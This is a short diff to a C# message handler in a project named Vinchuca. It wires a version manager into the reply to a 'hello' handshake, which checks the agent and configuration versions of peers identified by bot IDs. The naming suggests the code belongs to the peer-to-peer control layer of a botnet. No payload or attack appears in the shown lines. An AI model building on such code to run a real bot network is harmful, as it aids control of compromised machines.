@@ -1,9 +1,7 @@
-using System;
 using Vinchuca.Crypto;
 using Vinchuca.Network.Protocol.Messages;
 using Vinchuca.Network.Protocol.Messages.System;
 using Vinchuca.Network.Protocol.Peers;
-using Vinchuca.Workers;
 
 namespace Vinchuca.Network.Protocol.Handlers
 {
@@ -11,11 +9,13 @@ namespace Vinchuca.Network.Protocol.Handlers
     {
         private readonly PeerList _peerList;
         private readonly MessageManager _messageManager;
+        private readonly VersionManager _versionManager;
 
-        public HelloAckSynMessageHandler(PeerList peerList, MessageManager messageManager)
+        public HelloAckSynMessageHandler(PeerList peerList, MessageManager messageManager, VersionManager versionManager)
         {
             _peerList = peerList;
             _messageManager = messageManager;
+            _versionManager = versionManager;
         }
 
         public void Handle(BotMessage botMessage)
@@ -40,8 +40,8 @@ namespace Vinchuca.Network.Protocol.Handlers
                 };
                 _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
 
-                //_versionManager.CheckBotVersion(msg.BotVersion, msg.Header.BotId, endpoint);
-                //_versionManager.CheckCfgVersion(msg.CfgVersion, msg.Header.BotId, endpoint);
+                _versionManager.CheckAgentVersion(msg.BotVersion, botMessage.Header.BotId);
+                _versionManager.CheckConfigurationFileVersion(msg.CfgVersion, botMessage.Header.BotId);
             }
         }
     }
